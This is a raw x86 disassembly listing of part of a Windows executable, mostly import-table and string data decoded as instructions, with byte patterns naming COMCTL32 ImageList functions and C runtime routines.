  427d71:	je     0x427dd8
  427d73:	push   eax
  427d74:	outs   dx,DWORD PTR ds:[esi]
  427d75:	imul   ebp,DWORD PTR [esi+0x74],0x4077654e
  427d7c:	inc    eax
  427d7d:	pop    ecx
  427d7e:	inc    edi
  427d7f:	inc    esi
  427d80:	push   eax
  427d81:	inc    ecx
  427d82:	pop    edi
  427d83:	dec    esi
  427d84:	inc    esp
  427d85:	cmp    al,0x56
  427d87:	add    bh,dh
  427d89:	jl     0x427dcd
  427d8b:	add    bl,bh
  427d8d:	jl     0x427dd1
  427d8f:	add    bh,bh
  427d91:	jl     0x427dd5
  427d93:	add    BYTE PTR [ebx],al
  427d95:	jge    0x427dd9
  427d97:	add    BYTE PTR [edi],al
  427d99:	jge    0x427ddd
  427d9b:	add    BYTE PTR [ebx],cl
  427d9d:	jge    0x427de1
  427d9f:	add    BYTE PTR [edi],cl
  427da1:	jge    0x427de5
  427da3:	add    BYTE PTR [ebx],dl
  427da5:	jge    0x427de9
  427da7:	add    BYTE PTR [edi],dl
  427da9:	jge    0x427ded
  427dab:	add    BYTE PTR [ebx],bl
  427dad:	jge    0x427df1
  427daf:	add    BYTE PTR [edi],bl
  427db1:	jge    0x427df5
  427db3:	add    BYTE PTR [eax],al
  427db5:	add    BYTE PTR [eax],al
  427db7:	das    
  427db8:	jle    0x427dbc
	...
  427dc2:	add    bl,al
  427dc4:	add    BYTE PTR [edx],0x0
  427dc7:	out    0x78,eax
  427dc9:	add    al,BYTE PTR [eax]
  427dcb:	dec    ebx
  427dcc:	jle    0x427dd0
	...
  427dd6:	add    BYTE PTR [ebp+0x3000284],dh
  427ddc:	jns    0x427de0
  427dde:	add    bh,bh
  427de0:	jle    0x427de4
	...
  427dea:	add    BYTE PTR [edi-0x78],dl
  427ded:	add    al,BYTE PTR [eax]
  427def:	mov    bh,0x79
  427df1:	add    al,BYTE PTR [eax]
  427df3:	sar    DWORD PTR [edi+0x2],cl
	...
  427dfe:	add    BYTE PTR [edi-0x74fffd71],ah
  427e04:	jp     0x427e08
  427e06:	add    BYTE PTR [edi+0x281],al
  427e0c:	add    BYTE PTR [eax],al
  427e0e:	add    BYTE PTR [eax],al
  427e10:	add    BYTE PTR [eax],al
  427e12:	add    BYTE PTR [edi+0x3f000292],dl
  427e18:	jl     0x427e1c
	...
  427e2e:	add    BYTE PTR [edi],bh
  427e30:	add    BYTE PTR [edx],0x0
  427e33:	push   ecx
  427e34:	add    BYTE PTR [edx],0x0
  427e37:	imul   eax,DWORD PTR [edx-0x7d7efffe],0x82970002
  427e41:	add    al,BYTE PTR [eax]
  427e43:	stos   DWORD PTR es:[edi],eax
  427e44:	add    BYTE PTR [edx],0x0
  427e47:	add    BYTE PTR [eax],al
  427e49:	add    BYTE PTR [eax],al
  427e4b:	rol    DWORD PTR [edx-0x7d20fffe],1
  427e51:	add    al,BYTE PTR [eax]
  427e53:	jmp    0xf34280da
  427e58:	add    BYTE PTR [edx],0x0
  427e5b:	std    
  427e5c:	add    BYTE PTR [edx],0x0
  427e5f:	jae    0x835f7e67
  427e65:	add    al,BYTE PTR [eax]
  427e67:	and    eax,0x35000283
  427e6c:	add    DWORD PTR [edx],0x0
  427e6f:	aas    
  427e70:	add    DWORD PTR [edx],0x0
  427e73:	dec    ecx
  427e74:	add    DWORD PTR [edx],0x0
  427e77:	push   ebx
  427e78:	add    DWORD PTR [edx],0x0
  427e7b:	pop    ebp
  427e7c:	add    DWORD PTR [edx],0x0
  427e7f:	add    DWORD PTR [bp+si],0x0
  427e83:	jno    0x427e08
  427e85:	add    al,BYTE PTR [eax]
  427e87:	jns    0x427e0c
  427e89:	add    al,BYTE PTR [eax]
  427e8b:	add    DWORD PTR [ebx-0x7c74fffe],0x83950002
  427e95:	add    al,BYTE PTR [eax]
  427e97:	lahf   
  427e98:	add    DWORD PTR [edx],0x0
  427e9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e9c:	add    DWORD PTR [edx],0x0
  427e9f:	mov    ch,0x83
  427ea1:	add    al,BYTE PTR [eax]
  427ea3:	rol    DWORD PTR [ebx-0x7c32fffe],0x2
  427eaa:	add    cl,bl
  427eac:	add    DWORD PTR [edx],0x0
  427eaf:	jecxz  0x427e34
  427eb1:	add    al,BYTE PTR [eax]
  427eb3:	out    dx,eax
  427eb4:	add    DWORD PTR [edx],0x0
  427eb7:	std    
  427eb8:	add    DWORD PTR [edx],0x0
  427ebb:	pop    es
  427ebc:	test   BYTE PTR [edx],al
  427ebe:	add    BYTE PTR [ecx],dl
  427ec0:	test   BYTE PTR [edx],al
  427ec2:	add    BYTE PTR [edi],bl
  427ec4:	test   BYTE PTR [edx],al
  427ec6:	add    BYTE PTR [edi],ah
  427ec8:	test   BYTE PTR [edx],al
  427eca:	add    BYTE PTR [ecx],dh
  427ecc:	test   BYTE PTR [edx],al
  427ece:	add    BYTE PTR [ebx],bh
  427ed0:	test   BYTE PTR [edx],al
  427ed2:	add    BYTE PTR [ebp-0x7c],al
  427ed5:	add    al,BYTE PTR [eax]
  427ed7:	dec    ebp
  427ed8:	test   BYTE PTR [edx],al
  427eda:	add    BYTE PTR [edi-0x7c],dl
  427edd:	add    al,BYTE PTR [eax]
  427edf:	popa   
  427ee0:	test   BYTE PTR [edx],al
  427ee2:	add    BYTE PTR [ebx-0x7c],ch
  427ee5:	add    al,BYTE PTR [eax]
  427ee7:	jg     0x427e6d
  427ee9:	add    al,BYTE PTR [eax]
  427eeb:	mov    DWORD PTR [edx+eax*1+0x2849300],eax
  427ef2:	add    BYTE PTR [ebx-0x54fffd7c],bl
  427ef8:	test   BYTE PTR [edx],al
  427efa:	add    BYTE PTR [eax],al
  427efc:	add    BYTE PTR [eax],al
  427efe:	add    cl,al
  427f00:	test   BYTE PTR [edx],al
  427f02:	add    cl,bl
  427f04:	test   BYTE PTR [edx],al
  427f06:	add    bh,ah
  427f08:	test   BYTE PTR [edx],al
  427f0a:	add    bl,bh
  427f0c:	test   BYTE PTR [edx],al
  427f0e:	add    BYTE PTR ds:0x1d000285,cl
  427f14:	test   DWORD PTR [edx],eax
  427f16:	add    BYTE PTR [edi],ch
  427f18:	test   DWORD PTR [edx],eax
  427f1a:	add    BYTE PTR ds:0x51000285,bh
  427f20:	test   DWORD PTR [edx],eax
  427f22:	add    BYTE PTR [ecx-0x7b],ah
  427f25:	add    al,BYTE PTR [eax]
  427f27:	ja     0x427eae
  427f29:	add    al,BYTE PTR [eax]
  427f2b:	mov    eax,DWORD PTR [ebp-0x7a64fffe]
  427f31:	add    al,BYTE PTR [eax]
  427f33:	mov    ds:0xb9000285,eax
  427f38:	test   DWORD PTR [edx],eax
  427f3a:	add    cl,cl
  427f3c:	test   DWORD PTR [edx],eax
  427f3e:	add    ch,dl
  427f40:	test   DWORD PTR [edx],eax
  427f42:	add    bh,ah
  427f44:	test   DWORD PTR [edx],eax
  427f46:	add    cl,dh
  427f48:	test   DWORD PTR [edx],eax
  427f4a:	add    BYTE PTR [ebx],cl
  427f4c:	xchg   BYTE PTR [edx],al
  427f4e:	add    BYTE PTR [ecx],ah
  427f50:	xchg   BYTE PTR [edx],al
  427f52:	add    BYTE PTR ds:0x45000286,dh
  427f58:	xchg   BYTE PTR [edx],al
  427f5a:	add    BYTE PTR [ecx-0x7a],dl
  427f5d:	add    al,BYTE PTR [eax]
  427f5f:	popa   
  427f60:	xchg   BYTE PTR [edx],al
  427f62:	add    BYTE PTR [ebp-0x7a],ch
  427f65:	add    al,BYTE PTR [eax]
  427f67:	jg     0x427eef
  427f69:	add    al,BYTE PTR [eax]
  427f6b:	lea    eax,[esi-0x7964fffe]
  427f71:	add    al,BYTE PTR [eax]
  427f73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427f74:	xchg   BYTE PTR [edx],al
  427f76:	add    BYTE PTR [ecx-0x32fffd7a],bh
  427f7c:	xchg   BYTE PTR [edx],al
  427f7e:	add    cl,bl
  427f80:	xchg   BYTE PTR [edx],al
  427f82:	add    ch,ch
  427f84:	xchg   BYTE PTR [edx],al
  427f86:	add    bl,bh
  427f88:	xchg   BYTE PTR [edx],al
  427f8a:	add    BYTE PTR ds:0x1d000287,cl
  427f90:	xchg   DWORD PTR [edx],eax
  427f92:	add    BYTE PTR [ebx],ch
  427f94:	xchg   DWORD PTR [edx],eax
  427f96:	add    BYTE PTR [ecx-0x79],al
  427f99:	add    al,BYTE PTR [eax]
  427f9b:	dec    ebp
  427f9c:	xchg   DWORD PTR [edx],eax
  427f9e:	add    BYTE PTR [ebx-0x79],ah
  427fa1:	add    al,BYTE PTR [eax]
  427fa3:	jg     0x427f2c
  427fa5:	add    al,BYTE PTR [eax]
  427fa7:	xchg   ebx,eax
  427fa8:	xchg   DWORD PTR [edx],eax
  427faa:	add    BYTE PTR [edi-0x44fffd79],ah
  427fb0:	xchg   DWORD PTR [edx],eax
  427fb2:	add    cl,dl
  427fb4:	xchg   DWORD PTR [edx],eax
  427fb6:	add    cl,ch
  427fb8:	xchg   DWORD PTR [edx],eax
  427fba:	add    bh,dh
  427fbc:	xchg   DWORD PTR [edx],eax
  427fbe:	add    BYTE PTR [ecx],cl
  427fc0:	mov    BYTE PTR [edx],al
  427fc2:	add    BYTE PTR [edi],bl
  427fc4:	mov    BYTE PTR [edx],al
  427fc6:	add    BYTE PTR [ecx],dh
  427fc8:	mov    BYTE PTR [edx],al
  427fca:	add    BYTE PTR [ebp-0x78],al
  427fcd:	add    al,BYTE PTR [eax]
  427fcf:	add    BYTE PTR [eax],al
  427fd1:	add    BYTE PTR [eax],al
  427fd3:	mov    BYTE PTR gs:[edx],al
  427fd6:	add    BYTE PTR [ebx-0x78],dh
  427fd9:	add    al,BYTE PTR [eax]
  427fdb:	test   DWORD PTR [eax-0x7768fffe],ecx
  427fe1:	add    al,BYTE PTR [eax]
  427fe3:	mov    ds:0xb5000288,eax
  427fe8:	mov    BYTE PTR [edx],al
  427fea:	add    bh,al
  427fec:	mov    BYTE PTR [edx],al
  427fee:	add    bl,bl
  427ff0:	mov    BYTE PTR [edx],al
  427ff2:	add    bh,ah
  427ff4:	mov    BYTE PTR [edx],al
  427ff6:	add    ch,dh
  427ff8:	mov    BYTE PTR [edx],al
  427ffa:	add    BYTE PTR [ecx],al
  427ffc:	mov    DWORD PTR [edx],eax
  427ffe:	add    BYTE PTR [ebx],dl
  428000:	mov    DWORD PTR [edx],eax
  428002:	add    BYTE PTR [ecx],ah
  428004:	mov    DWORD PTR [edx],eax
  428006:	add    BYTE PTR [edi],ch
  428008:	mov    DWORD PTR [edx],eax
  42800a:	add    BYTE PTR [ebx-0x77],cl
  42800d:	add    al,BYTE PTR [eax]
  42800f:	pop    ebx
  428010:	mov    DWORD PTR [edx],eax
  428012:	add    BYTE PTR [ebp-0x77],dh
  428015:	add    al,BYTE PTR [eax]
  428017:	test   DWORD PTR [ecx-0x7664fffe],ecx
  42801d:	add    al,BYTE PTR [eax]
  42801f:	stos   DWORD PTR es:[edi],eax
  428020:	mov    DWORD PTR [edx],eax
  428022:	add    BYTE PTR [edi-0x34fffd77],dh
  428028:	mov    DWORD PTR [edx],eax
  42802a:	add    bl,ah
  42802c:	mov    DWORD PTR [edx],eax
  42802e:	add    bh,ch
  428030:	mov    DWORD PTR [edx],eax
  428032:	add    bh,bh
  428034:	mov    DWORD PTR [edx],eax
  428036:	add    BYTE PTR [ebx],cl
  428038:	mov    al,BYTE PTR [edx]
  42803a:	add    BYTE PTR [edi],dl
  42803c:	mov    al,BYTE PTR [edx]
  42803e:	add    BYTE PTR ds:0x2f00028a,ah
  428044:	mov    al,BYTE PTR [edx]
  428046:	add    BYTE PTR [edi],bh
  428048:	mov    al,BYTE PTR [edx]
  42804a:	add    BYTE PTR [ecx-0x76],dl
  42804d:	add    al,BYTE PTR [eax]
  42804f:	pop    ebp
  428050:	mov    al,BYTE PTR [edx]
  428052:	add    BYTE PTR [edi-0x76],ch
  428055:	add    al,BYTE PTR [eax]
  428057:	jnp    0x427fe3
  428059:	add    al,BYTE PTR [eax]
  42805b:	xchg   DWORD PTR [edx-0x7568fffe],ecx
  428061:	add    al,BYTE PTR [eax]
  428063:	lods   eax,DWORD PTR ds:[esi]
  428064:	mov    al,BYTE PTR [edx]
  428066:	add    BYTE PTR [ebx-0x32fffd76],bh
  42806c:	mov    al,BYTE PTR [edx]
  42806e:	add    ch,bl
  428070:	mov    al,BYTE PTR [edx]
  428072:	add    ch,ch
  428074:	mov    al,BYTE PTR [edx]
  428076:	add    BYTE PTR [ecx],cl
  428078:	mov    eax,DWORD PTR [edx]
  42807a:	add    BYTE PTR [ecx],bl
  42807c:	mov    eax,DWORD PTR [edx]
  42807e:	add    BYTE PTR [ecx],ch
  428080:	mov    eax,DWORD PTR [edx]
  428082:	add    BYTE PTR [edi],dh
  428084:	mov    eax,DWORD PTR [edx]
  428086:	add    BYTE PTR [ebp-0x75],cl
  428089:	add    al,BYTE PTR [eax]
  42808b:	pop    ebx
  42808c:	mov    eax,DWORD PTR [edx]
  42808e:	add    BYTE PTR [ebp-0x75],ah
  428091:	add    al,BYTE PTR [eax]
  428093:	jno    0x428020
  428095:	add    al,BYTE PTR [eax]
  428097:	or     DWORD PTR [ebx-0x7464fffe],0x2
  42809e:	add    BYTE PTR [ebp-0x42fffd75],ch
  4280a4:	mov    eax,DWORD PTR [edx]
  4280a6:	add    cl,dl
  4280a8:	mov    eax,DWORD PTR [edx]
  4280aa:	add    cl,ah
  4280ac:	mov    eax,DWORD PTR [edx]
  4280ae:	add    bh,dh
  4280b0:	mov    eax,DWORD PTR [edx]
  4280b2:	add    BYTE PTR ds:0x1900028c,al
  4280b8:	mov    WORD PTR [edx],es
  4280ba:	add    BYTE PTR [edi],ah
  4280bc:	mov    WORD PTR [edx],es
  4280be:	add    BYTE PTR [ecx],bh
  4280c0:	mov    WORD PTR [edx],es
  4280c2:	add    BYTE PTR [ebx-0x74],cl
  4280c5:	add    al,BYTE PTR [eax]
  4280c7:	pop    ebp
  4280c8:	mov    WORD PTR [edx],es
  4280ca:	add    BYTE PTR [ecx-0x74],ch
  4280cd:	add    al,BYTE PTR [eax]
  4280cf:	ja     0x42805d
  4280d1:	add    al,BYTE PTR [eax]
  4280d3:	lea    ecx,[edx+eax*1+0x28ca100]
  4280da:	add    BYTE PTR [ebp-0x38fffd74],dh
  4280e0:	mov    WORD PTR [edx],es
  4280e2:	add    cl,dl
  4280e4:	mov    WORD PTR [edx],es
  4280e6:	add    bl,ah
  4280e8:	mov    WORD PTR [edx],es
  4280ea:	add    bh,dh
  4280ec:	mov    WORD PTR [edx],es
  4280ee:	add    BYTE PTR [ebx],cl
  4280f0:	lea    eax,[edx]
  4280f2:	add    BYTE PTR [ebx],bl
  4280f4:	lea    eax,[edx]
  4280f6:	add    BYTE PTR [ecx],ch
  4280f8:	lea    eax,[edx]
  4280fa:	add    BYTE PTR [ebx-0x73],al
  4280fd:	add    al,BYTE PTR [eax]
  4280ff:	pop    ebx
  428100:	lea    eax,[edx]
  428102:	add    BYTE PTR [ecx-0x73],ch
  428105:	add    al,BYTE PTR [eax]
  428107:	jnp    0x428096
  428109:	add    al,BYTE PTR [eax]
  42810b:	mov    DWORD PTR [ebp-0x726afffe],ecx
  428111:	add    al,BYTE PTR [eax]
  428113:	scas   eax,DWORD PTR es:[edi]
  428114:	lea    eax,[edx]
  428116:	add    cl,al
  428118:	lea    eax,[edx]
  42811a:	add    bl,dl
  42811c:	lea    eax,[edx]
  42811e:	add    bl,ah
  428120:	lea    eax,[edx]
  428122:	add    bl,dh
  428124:	lea    eax,[edx]
  428126:	add    ch,bh
  428128:	lea    eax,[edx]
  42812a:	add    BYTE PTR ds:0x1f00028e,cl
  428130:	mov    es,WORD PTR [edx]
  428132:	add    BYTE PTR [edi],ch
  428134:	mov    es,WORD PTR [edx]
  428136:	add    BYTE PTR [ebp-0x72],al
  428139:	add    al,BYTE PTR [eax]
  42813b:	pop    ebp
  42813c:	mov    es,WORD PTR [edx]
  42813e:	add    BYTE PTR [edi-0x72],ch
  428141:	add    al,BYTE PTR [eax]
  428143:	jg     0x4280d3
  428145:	add    al,BYTE PTR [eax]
  428147:	xchg   ecx,eax
  428148:	mov    es,WORD PTR [edx]
  42814a:	add    BYTE PTR [edi-0x4efffd72],bl
  428150:	mov    es,WORD PTR [edx]
  428152:	add    BYTE PTR [edi-0x2efffd72],bh
  428158:	mov    es,WORD PTR [edx]
  42815a:	add    bl,ah
  42815c:	mov    es,WORD PTR [edx]
  42815e:	add    bh,dh
  428160:	mov    es,WORD PTR [edx]
  428162:	add    BYTE PTR [ebx],cl
  428164:	pop    DWORD PTR [edx]
  428166:	add    BYTE PTR ds:0x3300028f,bl
  42816c:	pop    DWORD PTR [edx]
  42816e:	add    BYTE PTR [ebp-0x71],al
  428171:	add    al,BYTE PTR [eax]
  428173:	popa   
  428174:	pop    DWORD PTR [edx]
  428176:	add    BYTE PTR [edi-0x71],dh
  428179:	add    al,BYTE PTR [eax]
  42817b:	test   DWORD PTR [edi-0x7066fffe],ecx
  428181:	add    al,BYTE PTR [eax]
  428183:	add    BYTE PTR [eax],al
  428185:	add    BYTE PTR [eax],al
  428187:	mov    bl,0x8f
  428189:	add    al,BYTE PTR [eax]
  42818b:	ret    
  42818c:	pop    DWORD PTR [edx]
  42818e:	add    bl,bl
  428190:	pop    DWORD PTR [edx]
  428192:	add    ch,ah
  428194:	pop    DWORD PTR [edx]
  428196:	add    ch,dh
  428198:	pop    DWORD PTR [edx]
  42819a:	add    BYTE PTR [ecx],cl
  42819c:	nop
  42819d:	add    al,BYTE PTR [eax]
  42819f:	pop    ss
  4281a0:	nop
  4281a1:	add    al,BYTE PTR [eax]
  4281a3:	sub    edx,DWORD PTR [eax-0x6fc0fffe]
  4281a9:	add    al,BYTE PTR [eax]
  4281ab:	dec    edi
  4281ac:	nop
  4281ad:	add    al,BYTE PTR [eax]
  4281af:	pop    ebp
  4281b0:	nop
  4281b1:	add    al,BYTE PTR [eax]
  4281b3:	addr16 nop
  4281b5:	add    al,BYTE PTR [eax]
  4281b7:	jns    0x428149
  4281b9:	add    al,BYTE PTR [eax]
  4281bb:	lea    edx,[eax-0x6f66fffe]
  4281c1:	add    al,BYTE PTR [eax]
  4281c3:	scas   eax,DWORD PTR es:[edi]
  4281c4:	nop
  4281c5:	add    al,BYTE PTR [eax]
  4281c7:	ret    
  4281c8:	nop
  4281c9:	add    al,BYTE PTR [eax]
  4281cb:	rcl    DWORD PTR [eax-0x6f1afffe],1
  4281d1:	add    al,BYTE PTR [eax]
  4281d3:	stc    
  4281d4:	nop
  4281d5:	add    al,BYTE PTR [eax]
  4281d7:	add    eax,0x11000291
  4281dc:	xchg   ecx,eax
  4281dd:	add    al,BYTE PTR [eax]
  4281df:	daa    
  4281e0:	xchg   ecx,eax
  4281e1:	add    al,BYTE PTR [eax]
  4281e3:	xor    eax,0x41000291
  4281e8:	xchg   ecx,eax
  4281e9:	add    al,BYTE PTR [eax]
  4281eb:	push   ebx
  4281ec:	xchg   ecx,eax
  4281ed:	add    al,BYTE PTR [eax]
  4281ef:	imul   edx,DWORD PTR [ecx-0x6e88fffe],0x918b0002
  4281f9:	add    al,BYTE PTR [eax]
  4281fb:	fwait
  4281fc:	xchg   ecx,eax
  4281fd:	add    al,BYTE PTR [eax]
  4281ff:	stos   DWORD PTR es:[edi],eax
  428200:	xchg   ecx,eax
  428201:	add    al,BYTE PTR [eax]
  428203:	mov    ecx,0xc3000291
  428208:	xchg   ecx,eax
  428209:	add    al,BYTE PTR [eax]
  42820b:	int    0x91
  42820d:	add    al,BYTE PTR [eax]
  42820f:	fst    DWORD PTR [ecx-0x6e1afffe]
  428215:	add    al,BYTE PTR [eax]
  428217:	not    DWORD PTR [ecx-0x6df2fffe]
  42821d:	add    al,BYTE PTR [eax]
  42821f:	daa    
  428220:	xchg   edx,eax
  428221:	add    al,BYTE PTR [eax]
  428223:	aaa    
  428224:	xchg   edx,eax
  428225:	add    al,BYTE PTR [eax]
  428227:	inc    ecx
  428228:	xchg   edx,eax
  428229:	add    al,BYTE PTR [eax]
  42822b:	push   ecx
  42822c:	xchg   edx,eax
  42822d:	add    al,BYTE PTR [eax]
  42822f:	arpl   WORD PTR [edx-0x6d8efffe],dx
  428235:	add    al,BYTE PTR [eax]
  428237:	mov    edx,DWORD PTR [edx+0x2]
  42823d:	add    BYTE PTR [eax],al
  42823f:	pop    esp
  428240:	add    BYTE PTR [eax+0x72],dl
  428243:	outs   dx,DWORD PTR ds:[esi]
  428244:	jo     0x4282ab
  428246:	jb     0x4282bc
  428248:	jns    0x42829d
  42824a:	push   0x57746565
  42824f:	add    BYTE PTR [eax],al
  428251:	push   ebx
  428252:	add    BYTE PTR [ecx+0x6d],cl
  428255:	popa   
  428256:	addr16 gs dec esp
  428259:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  428260:	dec    ecx
  428261:	arpl   WORD PTR [edi+0x6e],bp
  428264:	push   ebx
  428265:	imul   edi,DWORD PTR [edx+0x65],0x49004e00
  42826c:	ins    DWORD PTR es:[edi],dx
  42826d:	popa   
  42826e:	addr16 gs dec esp
  428271:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  428278:	ins    BYTE PTR es:[edi],dx
  428279:	popa   
  42827a:	arpl   WORD PTR [ebp+0x49],sp
  42827d:	arpl   WORD PTR [edi+0x6e],bp
  428280:	add    BYTE PTR [eax+eax*1],ch
  428283:	dec    ecx
  428284:	ins    DWORD PTR es:[edi],dx
  428285:	popa   
  428286:	addr16 gs dec esp
  428289:	imul   esi,DWORD PTR [ebx+0x74],0x6464415f
  428290:	dec    ebp
  428291:	popa   
  428292:	jae    0x4282ff
  428294:	gs add BYTE PTR fs:[eax],dh
  428298:	add    BYTE PTR [ecx+0x6d],cl
  42829b:	popa   
  42829c:	addr16 gs dec esp
  42829f:	imul   esi,DWORD PTR [ebx+0x74],0x6572435f
  4282a6:	popa   
  4282a7:	je     0x42830e
  4282a9:	add    BYTE PTR [eax],al
  4282ab:	inc    ebp
  4282ac:	add    BYTE PTR [ecx+0x6d],cl
  4282af:	popa   
  4282b0:	addr16 gs dec esp
  4282b3:	imul   esi,DWORD PTR [ebx+0x74],0x616f4c5f
  4282ba:	fs dec ecx
  4282bc:	ins    DWORD PTR es:[edi],dx
  4282bd:	popa   
  4282be:	addr16 gs push edi
  4282c1:	add    BYTE PTR [eax],al
  4282c3:	inc    ebx
  4282c4:	dec    edi
  4282c5:	dec    ebp
  4282c6:	inc    ebx
  4282c7:	push   esp
  4282c8:	dec    esp
  4282c9:	xor    esi,DWORD PTR [edx]
  4282cb:	cs fs ins BYTE PTR es:[edi],dx
  4282ce:	ins    BYTE PTR es:[edi],dx
  4282cf:	add    BYTE PTR [eax],al
  4282d1:	cmc    
  4282d2:	add    BYTE PTR [edi+0x63],bl
  4282d5:	outs   dx,DWORD PTR ds:[esi]
  4282d6:	outs   dx,BYTE PTR ds:[esi]
  4282d7:	je     0x42834b
  4282d9:	outs   dx,DWORD PTR ds:[esi]
  4282da:	ins    BYTE PTR es:[edi],dx
  4282db:	data16 jo 0x4282de
  4282de:	add    BYTE PTR [ebx+0x3],bl
  4282e1:	bound  esi,QWORD PTR [ebx+0x65]
  4282e4:	popa   
  4282e5:	jb     0x42834a
  4282e7:	push   0x69039b00
  4282ec:	jae    0x42835e
  4282ee:	jb     0x428359
  4282f0:	outs   dx,BYTE PTR ds:[esi]
  4282f1:	je     0x4282f3
  4282f3:	test   BYTE PTR [ebx],0x73
  4282f6:	je     0x42836a
  4282f8:	jb     0x42835d
  4282fa:	push   0xb30072
  4282ff:	pop    edi
  428300:	pop    edi
  428301:	jae    0x428368
  428303:	je     0x428364
  428305:	popa   
  428306:	jo     0x428378
  428308:	pop    edi
  428309:	je     0x428384
  42830b:	jo     0x428372
  42830d:	add    BYTE PTR [eax],al
  42830f:	mov    al,ds:0x705f5f00
  428314:	pop    edi
  428315:	pop    edi
  428316:	ins    WORD PTR es:[edi],dx
  428318:	outs   dx,DWORD PTR ds:[esi]
  428319:	fs add BYTE PTR gs:[eax],al
  42831d:	jge    0x428322
  42831f:	data16 jb 0x428387
  428322:	add    BYTE PTR gs:[eax],al
  428325:	fwait
  428326:	add    BYTE PTR [edi+0x5f],bl
  428329:	jo     0x42838a
  42832b:	pop    edi
  42832c:	arpl   WORD PTR [edi+0x6d],bp
  42832f:	ins    DWORD PTR es:[edi],dx
  428330:	outs   dx,DWORD PTR ds:[esi]
  428331:	fs add BYTE PTR gs:[eax],al
  428335:	and    eax,0x73637704
  42833a:	ins    BYTE PTR es:[edi],dx
  42833b:	outs   dx,BYTE PTR gs:[esi]
  42833d:	add    BYTE PTR [eax],al
  42833f:	and    DWORD PTR [edi+esi*2],eax
  428342:	arpl   WORD PTR [ebx+0x63],si
  428345:	jo     0x4283c0
  428347:	add    BYTE PTR [eax],al
  428349:	or     al,BYTE PTR [esp+esi*2]
  42834c:	outs   dx,DWORD PTR ds:[esi]
  42834d:	jne    0x4283bf
  42834f:	jo     0x4283b6
  428351:	jb     0x428353
  428353:	rol    BYTE PTR [ebx],cl
  428355:	jb     0x4283bc
  428357:	ins    DWORD PTR es:[edi],dx
  428358:	outs   dx,DWORD PTR ds:[esi]
  428359:	jbe    0x4283c0
  42835b:	add    BYTE PTR [eax],al
  42835d:	xchg   edi,eax
  42835e:	add    ebp,DWORD PTR [ecx+0x73]
  428361:	imul   esp,DWORD PTR fs:[edi+0x69],0x3ea0074
  428369:	jae    0x4283df
  42836b:	jb     0x4283d0
  42836d:	jae    0x4283df
  42836f:	outs   dx,BYTE PTR ds:[esi]
  428370:	add    BYTE PTR [edi+0x74656703],cl
  428376:	jae    0x428378
  428378:	add    bh,cl
  42837a:	add    esi,DWORD PTR [edx+0x61]
  42837d:	outs   dx,BYTE PTR ds:[esi]
  42837e:	add    BYTE PTR fs:[eax],al
  428381:	mov    ch,0x3
  428383:	ins    DWORD PTR es:[edi],dx
  428384:	popa   
  428385:	ins    BYTE PTR es:[edi],dx
  428386:	ins    BYTE PTR es:[edi],dx
  428387:	outs   dx,DWORD PTR ds:[esi]
  428388:	arpl   WORD PTR [eax],ax
  42838a:	add    al,cl
  42838c:	add    esi,DWORD PTR [eax+0x75]
  42838f:	je     0x4283f4
  428391:	push   0x1c007261
  428396:	add    al,0x77
  428398:	arpl   WORD PTR [ebx+0x63],si
  42839b:	popa   
  42839c:	je     0x42839e
  42839e:	add    BYTE PTR [eax+0x3],ah
  4283a1:	arpl   WORD PTR [edi+ebp*2+0x63],bp
  4283a5:	imul   eax,DWORD PTR [eax],0xffffffdb
  4283a8:	add    BYTE PTR [edi+0x61],bl
  4283ab:	ins    DWORD PTR es:[edi],dx
  4283ac:	jae    0x428415
  4283ae:	pop    edi
  4283af:	gs js  0x42841b
  4283b2:	je     0x4283b4
  4283b4:	add    BYTE PTR [edi+0x77736903],ah
  4283ba:	jo     0x42842e
  4283bc:	imul   ebp,DWORD PTR [esi+0x74],0x1860000
  4283c3:	pop    edi
  4283c4:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  4283cb:	ins    DWORD PTR es:[edi],dx
  4283cc:	add    bl,ch
  4283ce:	add    esi,DWORD PTR [ebx+0x74]
  4283d1:	jb     0x428438
  4283d3:	jb     0x428447
  4283d5:	outs   dx,DWORD PTR ds:[esi]
  4283d6:	jb     0x4283d8
  4283d8:	add    ch,bh
  4283da:	add    esi,DWORD PTR [ebx+0x74]
  4283dd:	jb     0x428453
  4283df:	outs   dx,DWORD PTR ds:[esi]
  4283e0:	jne    0x42844e
  4283e2:	add    bh,bh
  4283e4:	add    esi,DWORD PTR [ebx+0x77]
  4283e7:	jo     0x42845b
  4283e9:	imul   ebp,DWORD PTR [esi+0x74],0x9e000066
  4283f0:	add    DWORD PTR [edi+0x69],ebx
  4283f3:	jae    0x428462
  4283f5:	bound  esp,QWORD PTR [edx+0x6c]
  4283f8:	gs popa 
  4283fa:	add    BYTE PTR fs:[eax],al
  4283fd:	fld    DWORD PTR [ebx]
  4283ff:	jae    0x428466
  428401:	je     0x428479
  428403:	bound  esi,QWORD PTR [ebp+0x66]
  428406:	add    BYTE PTR ds:0x676e7504,cl
  42840c:	gs je  0x428472
  42840f:	add    BYTE PTR [eax],al
  428411:	push   edx
  428412:	add    BYTE PTR [edi+0x58],bl
  428415:	arpl   WORD PTR [eax+0x74],si
  428418:	inc    esi
  428419:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x1230072
  428421:	pop    edi
  428422:	gs js  0x42848e
  428425:	je     0x428427
  428427:	in     eax,0x3
  428429:	jae    0x42849f
  42842b:	jb     0x428490
  42842d:	push   0xf2000072
  428432:	add    esi,DWORD PTR [ebx+0x74]
  428435:	jb     0x4284a5
  428437:	arpl   WORD PTR [eax+0x79],si
  42843a:	add    al,ch
  42843c:	add    BYTE PTR [edi+0x63],bl
  42843f:	gs js  0x4284ab
  428442:	je     0x428444
  428444:	add    BYTE PTR [ebp+0x3],ch
  428447:	data16 addr16 gs je 0x4284af
  42844c:	add    BYTE PTR ds:0x73637704,ch
  428452:	jb     0x4284b7
  428454:	push   0x4200072
  428459:	ja     0x4284be
  42845b:	jae    0x4284c0
  42845d:	outs   dx,DWORD PTR ds:[esi]
  42845e:	ins    BYTE PTR es:[edi],dx
  42845f:	ins    BYTE PTR es:[edi],dx
  428460:	add    cl,ah
  428462:	add    esi,DWORD PTR [ebx+0x73]
  428465:	arpl   WORD PTR [ecx+0x6e],sp
  428468:	data16 add BYTE PTR [eax],al
  42846b:	mov    ch,0x0
  42846d:	pop    edi
  42846e:	pop    edi
  42846f:	jae    0x4284d6
  428471:	je     0x4284e8
